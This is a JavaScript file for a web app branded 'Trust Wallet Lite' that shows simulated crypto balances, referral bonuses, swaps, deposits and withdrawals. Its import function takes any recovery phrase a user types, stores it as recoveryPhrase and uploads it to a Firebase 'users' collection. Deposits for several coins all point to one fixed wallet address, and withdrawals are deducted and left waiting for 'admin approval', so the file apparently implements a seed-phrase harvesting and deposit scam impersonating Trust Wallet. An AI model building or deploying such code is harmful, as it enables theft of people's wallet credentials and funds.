// ========== FIREBASE CONFIGURATION ==========
const firebaseConfig = {
    apiKey: "AIzaSyBUg917YwHALAYCIGbOyH142FWDVDdNUGo",
    authDomain: "m7fdha-9bf18.firebaseapp.com",
    projectId: "m7fdha-9bf18",
    storageBucket: "m7fdha-9bf18.firebasestorage.app",
    messagingSenderId: "354288385604",
    appId: "1:354288385604:web:2c078dd2b41cd1287ec611"
};

// Initialize Firebase
let db = null;
let firebaseInitialized = false;

// ========== CONSTANTS ==========
const REFERRAL_BONUS = 25; // 25 TWT per referral
const WELCOME_BONUS = 10; // 10 TWT for new user
const SWAP_RATE = 1; // 1 USDT = 1 TWT
const ADMIN_ID = "1653918641"; // CHANGE THIS

// TWT CoinGecko ID
const TWT_COINGECKO_ID = 'trust-wallet-token';

// Live prices storage
let livePrices = {
    TWT: { price: 1.25, change: 0 },
    USDT: { price: 1, change: 0 },
    BNB: { price: 600, change: 0 },
    BTC: { price: 65000, change: 0 },
    ETH: { price: 3400, change: 0 },
    SOL: { price: 150, change: 0 },
    TRX: { price: 0.25, change: 0 }
};

// ========== COINMARKETCAP ICONS ==========
const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png'
};

// Assets list
const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' },
    { symbol: 'BNB', name: 'BNB' },
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' }
];

// Referral Milestones (بـ TWT)
const REFERRAL_MILESTONES = [
    { referrals: 10, reward: 50, unit: 'TWT' },
    { referrals: 25, reward: 120, unit: 'TWT' },
    { referrals: 50, reward: 250, unit: 'TWT' },
    { referrals: 100, reward: 500, unit: 'TWT' },
    { referrals: 250, reward: 1000, unit: 'TWT' }
];

// Deposit addresses
const DEPOSIT_ADDRESSES = {
    TWT: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    USDT: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    BNB: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    BTC: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    ETH: '0xbf70420f57342c6Bd4267430D4D3b7E946f09450',
    SOL: '3DjcSVxfeP3u4WcV9KniMH11btgThnoGxcx54dMtbfuR',
    TRX: 'TMSJH4QunFiUAqZ8iLvQDPajs1v4B3e5E6'
};

// Deposit minimums
const DEPOSIT_MINIMUMS = {
    TWT: 10,
    USDT: 10,
    BNB: 0.02,
    BTC: 0.0005,
    ETH: 0.005,
    SOL: 0.12,
    TRX: 40
};

// ========== GLOBAL VARIABLES ==========
let userData = null;
let currentUser = null;
let currentTab = 'wallet';
let isAdmin = false;
let pendingDeposits = [];
let pendingWithdrawals = [];

// ========== INITIALIZATION ==========
document.addEventListener('DOMContentLoaded', async () => {
    // Update title
    document.title = "Trust Wallet Lite";
    
    // Initialize Firebase
    await initFirebase();
    
    // Fetch prices
    await fetchLivePrices();
    setInterval(fetchLivePrices, 1800000);
    
    // Hide splash after 1.5s
    setTimeout(() => {
        const splash = document.getElementById('splashScreen');
        if (splash) splash.classList.add('hidden');
    }, 1500);
    
    // Check for existing user
    const storedUser = localStorage.getItem('twtpay_user');
    if (storedUser) {
        userData = JSON.parse(storedUser);
        currentUser = userData.userId;
        isAdmin = currentUser === ADMIN_ID;
        showMainApp();
        updateUI();
        setupEventListeners();
        
        if (firebaseInitialized) syncWithFirebase();
    } else {
        showOnboarding();
    }
    
    setupAdminCheck();
    setupEventListeners();
});

async function initFirebase() {
    try {
        if (typeof firebase !== 'undefined') {
            firebase.initializeApp(firebaseConfig);
            db = firebase.firestore();
            console.log("✅ Firebase initialized");
            firebaseInitialized = true;
        }
    } catch (error) {
        console.warn("⚠️ Firebase not available:", error);
    }
}

async function fetchLivePrices() {
    try {
        const response = await fetch(
            'https://api.coingecko.com/api/v3/simple/price?ids=trust-wallet-token,tether,binancecoin,bitcoin,ethereum,solana,tron&vs_currencies=usd&include_24hr_change=true'
        );
        const data = await response.json();
        
        livePrices = {
            TWT: { price: data['trust-wallet-token']?.usd || 1.25, change: data['trust-wallet-token']?.usd_24h_change || 0 },
            USDT: { price: 1, change: 0 },
            BNB: { price: data['binancecoin']?.usd || 600, change: data['binancecoin']?.usd_24h_change || 0 },
            BTC: { price: data['bitcoin']?.usd || 65000, change: data['bitcoin']?.usd_24h_change || 0 },
            ETH: { price: data['ethereum']?.usd || 3400, change: data['ethereum']?.usd_24h_change || 0 },
            SOL: { price: data['solana']?.usd || 150, change: data['solana']?.usd_24h_change || 0 },
            TRX: { price: data['tron']?.usd || 0.25, change: data['tron']?.usd_24h_change || 0 }
        };
        
        updateUIPrices();
    } catch (error) {
        console.error("Error fetching prices:", error);
    }
}

function updateUIPrices() {
    if (currentTab === 'wallet') {
        renderAssets();
        updateTotalBalance();
    }
}

function getCurrencyIcon(symbol) {
    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
}

// ========== ONBOARDING ==========
function showOnboarding() {
    const onboarding = document.getElementById('onboardingScreen');
    const main = document.getElementById('mainContent');
    if (onboarding) onboarding.classList.remove('hidden');
    if (main) main.classList.add('hidden');
}

function showMainApp() {
    const onboarding = document.getElementById('onboardingScreen');
    const main = document.getElementById('mainContent');
    if (onboarding) onboarding.classList.add('hidden');
    if (main) main.classList.remove('hidden');
    switchTab('wallet');
}

function createNewWallet() {
    // Show loading animation
    const createBtn = document.getElementById('createWalletBtn');
    const originalText = createBtn.innerHTML;
    createBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    createBtn.disabled = true;
    
    setTimeout(() => {
        const userId = 'user_' + Math.random().toString(36).substr(2, 9);
        const referralCode = userId.substr(-8).toUpperCase();
        
        userData = {
            userId: userId,
            userName: 'User',
            referralCode: referralCode,
            referredBy: null,
            referralCount: 0,
            referrals: [],
            balances: {
                TWT: WELCOME_BONUS,
                USDT: 0,
                BNB: 0,
                BTC: 0,
                ETH: 0,
                SOL: 0,
                TRX: 0
            },
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [],
            transactions: [],
            depositRequests: [],
            withdrawalRequests: [],
            totalTwtEarned: WELCOME_BONUS,
            totalUsdtEarned: 0,
            createdAt: new Date().toISOString()
        };
        
        currentUser = userId;
        isAdmin = currentUser === ADMIN_ID;
        
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
        
        if (db) {
            db.collection('users').doc(userId).set(userData).catch(console.error);
        }
        
        // Check for referral in URL
        const urlParams = new URLSearchParams(window.location.search);
        const refCode = urlParams.get('ref');
        if (refCode && refCode !== referralCode) {
            processReferral(refCode);
        }
        
        showMainApp();
        updateUI();
        setupAdminCheck();
        showToast(`🎉 Welcome! You received ${WELCOME_BONUS} TWT!`, 'success');
        
        createBtn.innerHTML = originalText;
        createBtn.disabled = false;
    }, 800);
}

function showImportModal() {
    document.getElementById('importModal').classList.add('show');
}

function closeImportModal() {
    document.getElementById('importModal').classList.remove('show');
    document.getElementById('importPhrase').value = '';
    document.getElementById('importError').style.display = 'none';
}

function importWallet() {
    const phrase = document.getElementById('importPhrase').value.trim();
    const errorDiv = document.getElementById('importError');
    
    if (!phrase) {
        errorDiv.textContent = 'Please enter your recovery phrase';
        errorDiv.style.display = 'block';
        return;
    }
    
    // For demo, accept any phrase (in production, this would validate)
    const importBtn = document.getElementById('confirmImportBtn');
    const originalText = importBtn.innerHTML;
    importBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
    importBtn.disabled = true;
    
    setTimeout(() => {
        // Check if user exists with this phrase (demo: check localStorage)
        const storedData = localStorage.getItem('twtpay_user');
        if (storedData) {
            const existing = JSON.parse(storedData);
            if (existing.recoveryPhrase === phrase) {
                userData = existing;
                currentUser = userData.userId;
                isAdmin = currentUser === ADMIN_ID;
                localStorage.setItem('twtpay_user', JSON.stringify(userData));
                closeImportModal();
                showMainApp();
                updateUI();
                setupAdminCheck();
                showToast('Wallet imported successfully!', 'success');
                importBtn.innerHTML = originalText;
                importBtn.disabled = false;
                return;
            }
        }
        
        // Create new wallet with this phrase as recovery
        const userId = 'user_' + Math.random().toString(36).substr(2, 9);
        const referralCode = userId.substr(-8).toUpperCase();
        
        userData = {
            userId: userId,
            userName: 'User',
            referralCode: referralCode,
            recoveryPhrase: phrase,
            referredBy: null,
            referralCount: 0,
            referrals: [],
            balances: {
                TWT: WELCOME_BONUS,
                USDT: 0,
                BNB: 0,
                BTC: 0,
                ETH: 0,
                SOL: 0,
                TRX: 0
            },
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [],
            transactions: [],
            depositRequests: [],
            withdrawalRequests: [],
            totalTwtEarned: WELCOME_BONUS,
            totalUsdtEarned: 0,
            createdAt: new Date().toISOString()
        };
        
        currentUser = userId;
        isAdmin = currentUser === ADMIN_ID;
        localStorage.setItem('twtpay_user', JSON.stringify(userData));
        
        if (db) {
            db.collection('users').doc(userId).set(userData).catch(console.error);
        }
        
        closeImportModal();
        showMainApp();
        updateUI();
        setupAdminCheck();
        showToast(`🎉 Wallet created! You received ${WELCOME_BONUS} TWT!`, 'success');
        
        importBtn.innerHTML = originalText;
        importBtn.disabled = false;
    }, 800);
}

async function processReferral(referralCode) {
    userData.balances.TWT = (userData.balances.TWT || 0) + REFERRAL_BONUS;
    userData.totalTwtEarned = (userData.totalTwtEarned || 0) + REFERRAL_BONUS;
    userData.referralCount++;
    
    addNotification(`🎉 Someone joined with your link! You got ${REFERRAL_BONUS} TWT!`, 'success');
    
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    
    if (db) {
        await db.collection('users').doc(userData.userId).update({
            balances: userData.balances,
            referralCount: userData.referralCount,
            totalTwtEarned: userData.totalTwtEarned
        }).catch(console.error);
    }
    
    updateUI();
    if (currentTab === 'referral') renderReferral();
}

// ========== WALLET FUNCTIONS ==========
function calculateTotalBalance() {
    if (!userData) return 0;
    let total = 0;
    total += userData.balances.USDT || 0;
    total += (userData.balances.TWT || 0) * (livePrices.TWT?.price || 1.25);
    total += (userData.balances.BNB || 0) * (livePrices.BNB?.price || 600);
    total += (userData.balances.BTC || 0) * (livePrices.BTC?.price || 65000);
    total += (userData.balances.ETH || 0) * (livePrices.ETH?.price || 3400);
    total += (userData.balances.SOL || 0) * (livePrices.SOL?.price || 150);
    total += (userData.balances.TRX || 0) * (livePrices.TRX?.price || 0.25);
    return total;
}

function formatBalance(balance, symbol) {
    if (symbol === 'TWT') {
        return balance.toLocaleString() + ' TWT';
    } else if (symbol === 'USDT') {
        return '$' + balance.toFixed(2);
    } else if (symbol === 'BNB' || symbol === 'ETH' || symbol === 'SOL' || symbol === 'TRX') {
        return balance.toFixed(4) + ' ' + symbol;
    } else if (symbol === 'BTC') {
        return balance.toFixed(6) + ' BTC';
    }
    return balance.toLocaleString() + ' ' + symbol;
}

function renderAssets() {
    const container = document.getElementById('assetsList');
    if (!container || !userData) return;
    
    const sortedAssets = [...ALL_ASSETS].sort((a, b) => {
        const aBalance = userData.balances[a.symbol] || 0;
        const bBalance = userData.balances[b.symbol] || 0;
        return bBalance - aBalance;
    });
    
    container.innerHTML = sortedAssets.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = livePrices[asset.symbol]?.price || (asset.symbol === 'USDT' ? 1 : 0);
        const value = balance * price;
        const change = livePrices[asset.symbol]?.change || 0;
        const changeClass = change >= 0 ? 'positive' : 'negative';
        const changeSymbol = change >= 0 ? '+' : '';
        
        return `
            <div class="asset-item">
                <div class="asset-left">
                    <img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img" alt="${asset.symbol}">
                    <div class="asset-info">
                        <h4>${asset.name}</h4>
                        <p>
                            ${asset.symbol}
                            <span class="asset-change ${changeClass}">${changeSymbol}${change.toFixed(2)}%</span>
                        </p>
                    </div>
                </div>
                <div class="asset-right">
                    <div class="asset-balance">${formatBalance(balance, asset.symbol)}</div>
                    <div class="asset-value">$${value.toFixed(2)}</div>
                </div>
            </div>
        `;
    }).join('');
}

function updateTotalBalance() {
    const totalBalanceEl = document.getElementById('totalBalance');
    if (totalBalanceEl) {
        const total = calculateTotalBalance();
        totalBalanceEl.textContent = `$${total.toFixed(2)}`;
    }
}

function renderWallet() {
    const container = document.getElementById('walletContainer');
    if (!container) return;
    
    const totalBalance = calculateTotalBalance();
    
    container.innerHTML = `
        <div class="balance-card">
            <div class="total-balance" id="totalBalance">$${totalBalance.toFixed(2)}</div>
            <div class="balance-change">
                <i class="fas fa-arrow-up"></i>
                $${(totalBalance * 0.001).toFixed(2)} (+0.1%)
            </div>
        </div>
        
        <div class="action-buttons">
            <button class="action-btn" onclick="showSendModal()">
                <i class="fas fa-paper-plane"></i>
                <span>Send</span>
            </button>
            <button class="action-btn" onclick="showReceiveModal()">
                <i class="fas fa-arrow-down"></i>
                <span>Receive</span>
            </button>
            <button class="action-btn" onclick="showSwapModal()">
                <i class="fas fa-exchange-alt"></i>
                <span>Swap</span>
            </button>
            <button class="action-btn" onclick="showBuyModal()">
                <i class="fas fa-shopping-cart"></i>
                <span>Buy</span>
            </button>
        </div>
        
        <div class="section-tabs">
            <button class="section-tab active" onclick="switchAssetTab('crypto')">Crypto</button>
            <button class="section-tab" onclick="switchAssetTab('watchlist')">Watchlist</button>
            <button class="section-tab" onclick="switchAssetTab('nfts')">NFTs</button>
        </div>
        
        <div id="assetsList" class="assets-list"></div>
    `;
    
    renderAssets();
}

// ========== REFERRAL FUNCTIONS ==========
function renderReferral() {
    const container = document.getElementById('referralContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="referral-stats">
            <h3>TOTAL REFERRALS</h3>
            <div class="stat-number">${userData.referralCount || 0}</div>
            <h3>TWT EARNED</h3>
            <div class="stat-number">${(userData.totalTwtEarned || 0).toLocaleString()} TWT</div>
            <h3>USDT EARNED</h3>
            <div class="stat-number">${(userData.totalUsdtEarned || 0).toFixed(2)} USDT</div>
        </div>
        
        <div class="referral-link-card">
            <h4>Your Referral Link</h4>
            <div class="link-container">
                <input type="text" id="referralLink" value="${getReferralLink()}" readonly>
                <button class="copy-btn" onclick="copyReferralLink()">
                    <i class="fas fa-copy"></i>
                </button>
                <button class="share-btn" onclick="shareReferral()">
                    <i class="fas fa-share-alt"></i>
                </button>
            </div>
            <p style="font-size: 12px; color: var(--text-muted); margin-top: 12px;">
                Share your link and get ${REFERRAL_BONUS} TWT for every friend who joins!
            </p>
        </div>
        
        <div class="milestones-list" id="milestonesList"></div>
    `;
    
    renderMilestones();
}

function getReferralLink() {
    return `${window.location.origin}${window.location.pathname}?ref=${userData.referralCode}`;
}

function copyReferralLink() {
    const link = getReferralLink();
    navigator.clipboard.writeText(link);
    showToast('Referral link copied!', 'success');
}

function shareReferral() {
    const link = getReferralLink();
    const text = `Join Trust Wallet Lite and get ${WELCOME_BONUS} TWT bonus! Use my link: ${link}`;
    navigator.clipboard.writeText(text);
    showToast('Link copied to clipboard!', 'success');
}

function renderMilestones() {
    const container = document.getElementById('milestonesList');
    if (!container) return;
    
    container.innerHTML = REFERRAL_MILESTONES.map(milestone => {
        const progress = Math.min((userData.referralCount / milestone.referrals) * 100, 100);
        const canClaim = userData.referralCount >= milestone.referrals && 
                        !userData.referralMilestones.find(m => m.referrals === milestone.referrals)?.claimed;
        const isClaimed = userData.referralMilestones.find(m => m.referrals === milestone.referrals)?.claimed;
        
        return `
            <div class="milestone-item">
                <div class="milestone-header">
                    <span class="milestone-referrals">
                        <i class="fas fa-users"></i>
                        ${milestone.referrals} Referrals
                    </span>
                    <span class="milestone-reward">${milestone.reward} ${milestone.unit}</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" style="width: ${progress}%"></div>
                </div>
                <div class="progress-text">${userData.referralCount}/${milestone.referrals}</div>
                ${canClaim ? 
                    `<button class="claim-btn" onclick="claimReferralMilestone(${milestone.referrals})">Claim Reward</button>` : 
                    isClaimed ? 
                    '<button class="claim-btn completed" disabled>Claimed</button>' : 
                    ''}
            </div>
        `;
    }).join('');
}

function claimReferralMilestone(referrals) {
    const milestone = REFERRAL_MILESTONES.find(m => m.referrals === referrals);
    const milestoneIndex = userData.referralMilestones.findIndex(m => m.referrals === referrals);
    
    if (milestoneIndex === -1 || userData.referralMilestones[milestoneIndex].claimed) return;
    if (userData.referralCount < referrals) {
        showToast(`You need ${referrals} referrals to claim this!`, 'error');
        return;
    }
    
    if (milestone.unit === 'TWT') {
        userData.balances.TWT = (userData.balances.TWT || 0) + milestone.reward;
        userData.totalTwtEarned = (userData.totalTwtEarned || 0) + milestone.reward;
    } else {
        userData.balances.USDT = (userData.balances.USDT || 0) + milestone.reward;
        userData.totalUsdtEarned = (userData.totalUsdtEarned || 0) + milestone.reward;
    }
    
    userData.referralMilestones[milestoneIndex].claimed = true;
    
    addTransaction({
        type: 'referral_reward',
        amount: milestone.reward,
        currency: milestone.unit,
        details: `Referral milestone: ${referrals} referrals`,
        timestamp: new Date().toISOString()
    });
    
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    
    if (db) {
        db.collection('users').doc(userData.userId).update({
            balances: userData.balances,
            referralMilestones: userData.referralMilestones
        }).catch(console.error);
    }
    
    updateUI();
    renderMilestones();
    showToast(`🎉 Claimed ${milestone.reward} ${milestone.unit}!`, 'success');
}

// ========== SEND/RECEIVE FUNCTIONS ==========
function showSendModal() {
    document.getElementById('sendModal').classList.add('show');
}

function showReceiveModal() {
    updateReceiveAddress(document.getElementById('receiveCurrencySymbol').textContent);
    document.getElementById('receiveModal').classList.add('show');
}

function sendTransaction() {
    const currency = document.getElementById('sendCurrencySymbol').textContent;
    const amount = parseFloat(document.getElementById('sendAmount').value);
    const address = document.getElementById('sendAddress').value.trim();
    
    if (!amount || amount <= 0) {
        showToast('Please enter a valid amount', 'error');
        return;
    }
    
    if (!address) {
        showToast('Please enter a recipient address', 'error');
        return;
    }
    
    if (!userData.balances[currency] || userData.balances[currency] < amount) {
        showToast(`Insufficient ${currency} balance`, 'error');
        return;
    }
    
    userData.balances[currency] -= amount;
    
    addTransaction({
        type: 'send',
        amount: amount,
        currency: currency,
        address: address,
        timestamp: new Date().toISOString()
    });
    
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    
    if (db) {
        db.collection('users').doc(userData.userId).update({
            balances: userData.balances
        }).catch(console.error);
    }
    
    updateUI();
    showToast(`✅ Sent ${amount} ${currency} to ${address.substring(0, 10)}...`, 'success');
    closeModal('sendModal');
    
    document.getElementById('sendAmount').value = '';
    document.getElementById('sendAddress').value = '';
}

function updateReceiveAddress(currency) {
    const address = DEPOSIT_ADDRESSES[currency] || DEPOSIT_ADDRESSES.TWT;
    document.getElementById('receiveAddress').textContent = address;
}

function copyAddress() {
    const address = document.getElementById('receiveAddress').textContent;
    navigator.clipboard.writeText(address);
    showToast('Address copied to clipboard!', 'success');
}

// ========== SWAP FUNCTIONS ==========
function showSwapModal() {
    updateSwapModal();
    document.getElementById('swapModal').classList.add('show');
}

function updateSwapModal() {
    updateSwapBalances();
    calculateSwap();
}

function updateSwapBalances() {
    const fromSymbol = document.getElementById('swapFromSymbol').textContent;
    const toSymbol = document.getElementById('swapToSymbol').textContent;
    
    document.getElementById('swapFromBalance').textContent = formatBalance(userData.balances[fromSymbol] || 0, fromSymbol);
    document.getElementById('swapToBalance').textContent = formatBalance(userData.balances[toSymbol] || 0, toSymbol);
}

function calculateSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount').value) || 0;
    const fromSymbol = document.getElementById('swapFromSymbol').textContent;
    const toSymbol = document.getElementById('swapToSymbol').textContent;
    
    let toAmount = 0;
    let rateText = '';
    
    if (fromSymbol === 'USDT' && toSymbol === 'TWT') {
        toAmount = fromAmount / (livePrices.TWT?.price || 1.25);
        rateText = `1 USDT = ${(1 / (livePrices.TWT?.price || 1.25)).toFixed(4)} TWT`;
    } else if (fromSymbol === 'TWT' && toSymbol === 'USDT') {
        toAmount = fromAmount * (livePrices.TWT?.price || 1.25);
        rateText = `1 TWT = $${(livePrices.TWT?.price || 1.25).toFixed(4)}`;
    } else {
        const fromPrice = livePrices[fromSymbol]?.price || 1;
        const toPrice = livePrices[toSymbol]?.price || 1;
        toAmount = (fromAmount * fromPrice) / toPrice;
        rateText = `1 ${fromSymbol} = ${(fromPrice / toPrice).toFixed(6)} ${toSymbol}`;
    }
    
    document.getElementById('swapToAmount').value = toAmount.toFixed(6);
    document.getElementById('swapRateDisplay').textContent = rateText;
}

function confirmSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount').value) || 0;
    const fromSymbol = document.getElementById('swapFromSymbol').textContent;
    const toSymbol = document.getElementById('swapToSymbol').textContent;
    const toAmount = parseFloat(document.getElementById('swapToAmount').value) || 0;
    
    if (!fromAmount || fromAmount <= 0) {
        showToast('Please enter an amount', 'error');
        return;
    }
    
    if (!userData.balances[fromSymbol] || userData.balances[fromSymbol] < fromAmount) {
        showToast(`Insufficient ${fromSymbol} balance`, 'error');
        return;
    }
    
    userData.balances[fromSymbol] -= fromAmount;
    userData.balances[toSymbol] = (userData.balances[toSymbol] || 0) + toAmount;
    
    addTransaction({
        type: 'swap',
        fromAmount: fromAmount,
        fromCurrency: fromSymbol,
        toAmount: toAmount,
        toCurrency: toSymbol,
        timestamp: new Date().toISOString()
    });
    
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    
    if (db) {
        db.collection('users').doc(userData.userId).update({
            balances: userData.balances
        }).catch(console.error);
    }
    
    updateUI();
    showToast(`✅ Swapped ${fromAmount} ${fromSymbol} to ${toAmount.toFixed(4)} ${toSymbol}`, 'success');
    closeModal('swapModal');
    document.getElementById('swapFromAmount').value = '';
}

// ========== DEPOSIT FUNCTIONS ==========
function showDepositModal() {
    updateDepositInfo();
    document.getElementById('depositModal').classList.add('show');
}

function updateDepositInfo() {
    const currency = document.getElementById('depositCurrency').value;
    const addressEl = document.getElementById('depositAddress');
    const minAmountEl = document.getElementById('depositMinAmount');
    
    addressEl.textContent = DEPOSIT_ADDRESSES[currency] || DEPOSIT_ADDRESSES.TWT;
    minAmountEl.textContent = DEPOSIT_MINIMUMS[currency] || 10;
}

function copyDepositAddress() {
    const address = document.getElementById('depositAddress').textContent;
    navigator.clipboard.writeText(address);
    showToast('Address copied to clipboard!', 'success');
}

function submitDeposit() {
    const currency = document.getElementById('depositCurrency').value;
    const amount = parseFloat(document.getElementById('depositAmount').value);
    const txHash = document.getElementById('depositTxHash').value.trim();
    
    if (!amount || amount <= 0) {
        showToast('Please enter a valid amount', 'error');
        return;
    }
    
    const minAmount = DEPOSIT_MINIMUMS[currency] || 10;
    if (amount < minAmount) {
        showToast(`Minimum deposit is ${minAmount} ${currency}`, 'error');
        return;
    }
    
    if (!txHash) {
        showToast('Please enter transaction hash', 'error');
        return;
    }
    
    const depositRequest = {
        id: 'dep_' + Date.now(),
        currency: currency,
        amount: amount,
        txHash: txHash,
        status: 'pending',
        timestamp: new Date().toISOString(),
        userId: userData.userId
    };
    
    if (!userData.depositRequests) userData.depositRequests = [];
    userData.depositRequests.push(depositRequest);
    
    addNotification(`💰 Deposit request submitted: ${amount} ${currency}. Waiting for admin approval.`, 'info');
    
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    
    showToast(`✅ Deposit request submitted for ${amount} ${currency}!`, 'success');
    closeModal('depositModal');
    
    document.getElementById('depositAmount').value = '';
    document.getElementById('depositTxHash').value = '';
}

// ========== WITHDRAW FUNCTIONS ==========
function showWithdrawModal() {
    updateWithdrawInfo();
    document.getElementById('withdrawModal').classList.add('show');
}

function updateWithdrawInfo() {
    const currency = document.getElementById('withdrawCurrency').value;
    const minAmountEl = document.getElementById('withdrawMinAmount');
    const feeEl = document.getElementById('withdrawFee');
    
    minAmountEl.textContent = DEPOSIT_MINIMUMS[currency] || 10;
    
    if (currency === 'TWT') {
        feeEl.textContent = '1 TWT';
    } else if (currency === 'USDT') {
        feeEl.textContent = '0.16 USDT';
    } else if (currency === 'BNB') {
        feeEl.textContent = '0.0005 BNB';
    } else {
        feeEl.textContent = '0.001';
    }
}

function submitWithdrawal() {
    const currency = document.getElementById('withdrawCurrency').value;
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('withdrawAddress').value.trim();
    
    if (!amount || amount <= 0) {
        showToast('Please enter a valid amount', 'error');
        return;
    }
    
    const minAmount = DEPOSIT_MINIMUMS[currency] || 10;
    if (amount < minAmount) {
        showToast(`Minimum withdrawal is ${minAmount} ${currency}`, 'error');
        return;
    }
    
    if (!address) {
        showToast('Please enter withdrawal address', 'error');
        return;
    }
    
    if (!userData.balances[currency] || userData.balances[currency] < amount) {
        showToast(`Insufficient ${currency} balance`, 'error');
        return;
    }
    
    // Deduct balance immediately (will be refunded if rejected)
    userData.balances[currency] -= amount;
    
    const withdrawRequest = {
        id: 'wd_' + Date.now(),
        currency: currency,
        amount: amount,
        address: address,
        status: 'pending',
        timestamp: new Date().toISOString(),
        userId: userData.userId
    };
    
    if (!userData.withdrawalRequests) userData.withdrawalRequests = [];
    userData.withdrawalRequests.push(withdrawRequest);
    
    addNotification(`💸 Withdrawal request submitted: ${amount} ${currency}. Waiting for admin approval.`, 'info');
    
    localStorage.setItem('twtpay_user', JSON.stringify(userData));
    
    showToast(`✅ Withdrawal request submitted for ${amount} ${currency}!`, 'success');
    closeModal('withdrawModal');
    
    document.getElementById('withdrawAmount').value = '';
    document.getElementById('withdrawAddress').value = '';
    updateUI();
}

// ========== TWT PAY CARD ==========
function renderTWTPay() {
    const container = document.getElementById('twtpayContainer');
    if (!container) return;
    
    const twtBalance = userData.balances.TWT || 0;
    const twtValue = twtBalance * (livePrices.TWT?.price || 1.25);
    
    container.innerHTML = `
        <div class="virtual-card">
            <div class="card-chip">
                <i class="fas fa-microchip"></i>
            </div>
            <div class="card-brand">TWT Pay</div>
            <div class="card-number">
                <span>****</span>
                <span>****</span>
                <span>****</span>
                <span>${userData.userId.slice(-4)}</span>
            </div>
            <div class="card-details">
                <div class="card-holder">
                    <div class="label">Card Holder</div>
                    <div class="value">${userData.userName || 'TWT User'}</div>
                </div>
                <div class="card-expiry">
                    <div class="label">Expires</div>
                    <div class="value">12/28</div>
                </div>
            </div>
            <div class="card-balance">
                <div class="balance-label">Available Balance</div>
                <div class="balance-value">${twtBalance.toLocaleString()} TWT</div>
                <div class="balance-usd">≈ $${twtValue.toFixed(2)} USD</div>
            </div>
            <div class="card-footer">
                <i class="fab fa-visa"></i>
                <span>Virtual Card</span>
            </div>
        </div>
        
        <div class="card-actions">
            <button class="card-action-btn" onclick="showTopUpModal()">
                <i class="fas fa-plus-circle"></i>
                <span>Top Up</span>
            </button>
            <button class="card-action-btn" onclick="showCardSettings()">
                <i class="fas fa-sliders-h"></i>
                <span>Settings</span>
            </button>
            <button class="card-action-btn" onclick="showCardTransactions()">
                <i class="fas fa-history"></i>
                <span>History</span>
            </button>
        </div>
        
        <div class="card-features">
            <div class="feature">
                <i class="fas fa-globe"></i>
                <span>Global</span>
            </div>
            <div class="feature">
                <i class="fas fa-shield-alt"></i>
                <span>Secure</span>
            </div>
            <div class="feature">
                <i class="fas fa-percent"></i>
                <span>2% Cashback</span>
            </div>
            <div class="feature">
                <i class="fas fa-exchange-alt"></i>
                <span>Instant Swap</span>
            </div>
        </div>
    `;
}

function showTopUpModal() {
    showToast('Top up feature coming soon!', 'info');
}

function showCardSettings() {
    showToast('Card settings coming soon!', 'info');
}

function showCardTransactions() {
    const twtTransactions = (userData.transactions || []).filter(tx => 
        tx.currency === 'TWT' || tx.fromCurrency === 'TWT' || tx.toCurrency === 'TWT'
    );
    
    if (twtTransactions.length === 0) {
        showToast('No TWT transactions yet', 'info');
        return;
    }
    
    let message = '💳 TWT Card Transactions:\n\n';
    twtTransactions.slice(0, 5).forEach(tx => {
        const date = new Date(tx.timestamp).toLocaleDateString();
        if (tx.type === 'send') {
            message += `📤 Sent ${tx.amount} TWT (${date})\n`;
        } else if (tx.type === 'swap' && tx.toCurrency === 'TWT') {
            message += `🔄 Received ${tx.toAmount.toFixed(4)} TWT (${date})\n`;
        } else if (tx.type === 'referral_reward' && tx.currency === 'TWT') {
            message += `🎉 Referral: +${tx.amount} TWT (${date})\n`;
        }
    });
    
    alert(message);
}

// ========== SETTINGS FUNCTIONS ==========
function renderSettings() {
    const container = document.getElementById('settingsContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="settings-list">
            <div class="settings-item" onclick="showNotifications()">
                <i class="fas fa-bell"></i>
                <div class="info">
                    <div class="label">Notifications</div>
                    <div class="desc">View all notifications</div>
                </div>
                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item" onclick="showTransactionHistory()">
                <i class="fas fa-history"></i>
                <div class="info">
                    <div class="label">Transaction History</div>
                    <div class="desc">View all transactions</div>
                </div>
                <i class="fas fa-chevron-right"></i>
            </div>
            <div class="settings-item" onclick="showSecuritySettings()">
                <i class="fas fa-shield-alt"></i>
                <div class="info">
                    <div class="label">Security</div>
                    <div class="desc">Manage security settings</div>
                </div>
